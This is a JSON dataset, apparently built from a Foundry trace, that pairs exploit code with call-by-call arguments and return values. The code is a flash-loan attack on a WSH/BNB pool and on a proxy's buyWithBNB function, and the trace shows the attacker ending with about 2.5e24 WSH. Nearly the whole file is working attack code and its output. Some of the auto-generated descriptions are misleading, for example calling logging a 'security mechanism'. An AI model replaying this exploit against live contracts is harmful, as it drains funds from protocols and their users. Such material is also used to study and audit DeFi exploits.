@@ -1,0 +1,366 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        console.log(\"1. before attack wsh token balance of this = \", wshToken_.balanceOf(address(this)));\n        BNB_WSH_10000.flash(address(this), 5_000_000 ether, 0, \"\");\n        console.log(\"8. after attack wsh token balance of this = \", wshToken_.balanceOf(address(this)));\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an attack or exploit scenario. It first logs the balance of a specific token (`wshToken`) held by the contract before the attack. Then, it triggers a flash loan operation using the `BNB_WSH_10000` contract, borrowing a large amount of ether (5,000,000 ether). After the flash loan operation, it logs the token balance again to observe any changes resulting from the attack.\n\n2. Security mechanism:  \nThe function does not explicitly include security mechanisms like access control or input validation. However, the use of `console.log` statements helps in debugging and monitoring the state before and after the attack. The flash loan operation itself is a feature of decentralized finance (DeFi) protocols, which inherently relies on the security of the underlying smart contract (`BNB_WSH_10000`).\n\n3. Parameter Function:  \nThe `flash` function of `BNB_WSH_10000` takes four parameters:  \n- `address(this)`: Specifies the recipient of the flash loan, which is the current contract.  \n- `5_000_000 ether`: The amount of ether to borrow in the flash loan.  \n- `0`: Likely represents a fee or additional data, set to zero in this case.  \n- `\"\"`: An empty string, possibly used for additional data or instructions.  \n\n4. Return description:  \nThe function does not return any value. Instead, it logs the balance of `wshToken` before and after the flash loan operation. The output values in the logs are derived from the `balanceOf` function of the `wshToken_` contract, which retrieves the token balance of the current contract address.  \n\nIn summary, the `testExploit` function simulates an attack by borrowing a large amount of ether via a flash loan and logs the token balance before and after the operation to observe the effects. It lacks explicit security measures but relies on logging for monitoring. The parameters of the `flash` function define the loan details, and the function does not return a value but logs the token balance changes.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "701036",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2626",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "\"1. before attack wsh token balance of this = \", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "680894",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000000000 [5e24], 0, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2626",
+        "args": "0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E",
+        "original_code": null,
+        "description": null,
+        "return_value": "5076689927771500273502372 [5.076e24]"
+    },
+    {
+        "id": "2534",
+        "args": "0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E",
+        "original_code": null,
+        "description": null,
+        "return_value": "81756621717182567206 [8.175e19]"
+    },
+    {
+        "id": "32543",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000000000 [5e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "617342",
+        "args": "50000000000000000000000 [5e22], 0, 0x",
+        "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {\n        console.log(\"2. bnb_wsh_10000 pool wsh balance after flashloan = \", wshToken_.balanceOf(address(this)));\n\n        Uni_Router_V3.ExactInputSingleParams memory args = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(wshToken_),\n            tokenOut: address(bnbToken_),\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: 5_000_000 ether,\n            amountOutMinimum: 1,\n            sqrtPriceLimitX96: 0\n        });\n        routerv3_.exactInputSingle(args);\n\n        console.log(\"3. balance after exchanging wsh for bnb = \", bnbToken_.balanceOf(address(this)));\n        bnbToken_.withdraw(bnbToken_.balanceOf(address(this)));\n\n        console.log(\"4. [ ============= ATTACK START ============= ]\");\n        proxy_.call{value: address(this).balance}(abi.encodeWithSignature(\"buyWithBNB(uint256,bool)\", 2_770_000, false));\n",
+        "description": "1. Core functions:\n   The `uniswapV3FlashCallback` function is designed to handle a flash loan callback in a decentralized finance (DeFi) environment. It first logs the balance of a specific token (wshToken_) after receiving a flash loan. Then, it sets up parameters to exchange wshToken_ for another token (bnbToken_) using a Uniswap V3 router. After the exchange, it logs the new balance of bnbToken_ and withdraws the bnbToken_ balance. Finally, it initiates an attack by calling another contract's function with the withdrawn balance.\n\n2. Security mechanism:\n   The function includes logging statements (`console.log`) to track the state of token balances at different stages, which can help in debugging and monitoring. It uses the `call` method with `{value: address(this).balance}` to send the entire balance of the contract to another contract, ensuring that all available funds are used in the attack. The `abi.encodeWithSignature` method is used to encode the function call securely.\n\n3. Parameter Function:\n   - `fee0` and `fee1`: These parameters represent the fees associated with the flash loan. They are not directly used in the function but are part of the callback signature.\n   - `data`: This parameter contains additional data passed to the callback function. It is not used in the function but is part of the callback signature.\n   - The `ExactInputSingleParams` struct includes parameters for the token exchange:\n     - `tokenIn`: The address of the input token (wshToken_).\n     - `tokenOut`: The address of the output token (bnbToken_).\n     - `fee`: The fee tier for the Uniswap V3 pool.\n     - `recipient`: The address that will receive the output tokens.\n     - `deadline`: The timestamp by which the transaction must be completed.\n     - `amountIn`: The amount of input tokens to be exchanged.\n     - `amountOutMinimum`: The minimum amount of output tokens expected.\n     - `sqrtPriceLimitX96`: The price limit for the exchange.\n\n4. Return description:\n   The function does not return any value. Instead, it performs a series of actions: logging token balances, exchanging tokens, withdrawing tokens, and initiating an attack by calling another contract's function. The output of these actions is observed through the logged messages and the state changes in the token balances and the called contract.\n\nIn summary, the `uniswapV3FlashCallback` function handles a flash loan callback by exchanging tokens and initiating an attack. It includes logging for monitoring, uses secure methods for function calls, and does not return any value but performs actions that affect the contract's state and the state of another contract.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "626",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5000000000000000000000000 [5e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"2. bnb_wsh_10000 pool wsh balance after flashloan = \", 5000000000000000000000000 [5e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "221996",
+        "args": "ExactInputSingleParams({ tokenIn: 0x62694D43Ccb9B64e76e38385d15e325c7712A735, tokenOut: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1712247921 [1.712e9], amountIn: 5000000000000000000000000 [5e24], amountOutMinimum: 1, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "37344712626082242493 [3.734e19]"
+    },
+    {
+        "id": "214342",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 5000000000000000000000000 [5e24], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b62694d43ccb9b64e76e38385d15e325c7712a735000bb8bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "5000000000000000000000000 [5e24], -37344712626082242493 [-3.734e19]"
+    },
+    {
+        "id": "29962",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37344712626082242493 [3.734e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2626",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a",
+        "original_code": null,
+        "description": null,
+        "return_value": "108783178168262673449102909 [1.087e26]"
+    },
+    {
+        "id": "20280",
+        "args": "5000000000000000000000000 [5e24], -37344712626082242493 [-3.734e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b62694d43ccb9b64e76e38385d15e325c7712a735000bb8bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "16035",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a, 5000000000000000000000000 [5e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "626",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a",
+        "original_code": null,
+        "description": null,
+        "return_value": "113783178168262673449102909 [1.137e26]"
+    },
+    {
+        "id": "534",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "37344712626082242493 [3.734e19]"
+    },
+    {
+        "id": "0",
+        "args": "\"3. balance after exchanging wsh for bnb = \", 37344712626082242493 [3.734e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "37344712626082242493 [3.734e19]"
+    },
+    {
+        "id": "9181",
+        "args": "37344712626082242493 [3.734e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"4. [ ============= ATTACK START ============= ]\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "216841",
+        "args": "00000000000000000000000000000000000000000000000000000000002a44500000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "209519",
+        "args": "00000000000000000000000000000000000000000000000000000000002a44500000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "122827",
+        "args": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x62694D43Ccb9B64e76e38385d15e325c7712A735, 3000, 2770000000000000000000000 [2.77e24], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000245983fc4975c4c0"
+    },
+    {
+        "id": "97333",
+        "args": "0xF49D24216Cb5FE7f21b6b47C0F45a4F80d21c7F0, false, -2770000000000000000000000 [-2.77e24], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x62694d43ccb9b64e76e38385d15e325c7712a735000bb8bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
+        "original_code": null,
+        "description": null,
+        "return_value": null
+    },
+    {
+        "id": "27743",
+        "args": "0xF49D24216Cb5FE7f21b6b47C0F45a4F80d21c7F0, 2770000000000000000000000 [2.77e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a",
+        "original_code": null,
+        "description": null,
+        "return_value": "38126758294152782916 [3.812e19]"
+    },
+    {
+        "id": "2691",
+        "args": "-2770000000000000000000000 [-2.77e24], 2619269777880106176 [2.619e18], 0x62694d43ccb9b64e76e38385d15e325c7712a735000bb8bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
+        "original_code": null,
+        "description": null,
+        "return_value": null
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "30543",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2770000000000000000000000 [2.77e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "626",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2770000000000000000000000 [2.77e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"5. wsh balance after attack function buyWithBNB(",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"6. [ ============= ATTACK END ============= ]\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "120400",
+        "args": "ExactInputSingleParams({ tokenIn: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, tokenOut: 0x62694D43Ccb9B64e76e38385d15e325c7712A735, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1712247921 [1.712e9], amountIn: 34463515870414125700 [3.446e19], amountOutMinimum: 1, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "4797438179912631607253979 [4.797e24]"
+    },
+    {
+        "id": "115217",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 34463515870414125700 [3.446e19], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000bb862694d43ccb9b64e76e38385d15e325c7712a735000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "-4797438179912631607253979 [-4.797e24], 34463515870414125700 [3.446e19]"
+    },
+    {
+        "id": "3843",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4797438179912631607253979 [4.797e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a",
+        "original_code": null,
+        "description": null,
+        "return_value": "38126758294152782916 [3.812e19]"
+    },
+    {
+        "id": "37909",
+        "args": "-4797438179912631607253979 [-4.797e24], 34463515870414125700 [3.446e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000bb862694d43ccb9b64e76e38385d15e325c7712a735000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23974",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a, 34463515870414125700 [3.446e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a",
+        "original_code": null,
+        "description": null,
+        "return_value": "72590274164566908616 [7.259e19]"
+    },
+    {
+        "id": "0",
+        "args": "\"7. repay flashloan for bnb_wsh_10000 pool\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3843",
+        "args": "0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E, 5050000000000000000000000 [5.05e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "626",
+        "args": "0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E",
+        "original_code": null,
+        "description": null,
+        "return_value": "5126689927771500273502372 [5.126e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E",
+        "original_code": null,
+        "description": null,
+        "return_value": "81756621717182567206 [8.175e19]"
+    },
+    {
+        "id": "626",
+        "args": "WSM: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2517438179912631607253979 [2.517e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"8. after attack wsh token balance of this = \", 2517438179912631607253979 [2.517e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
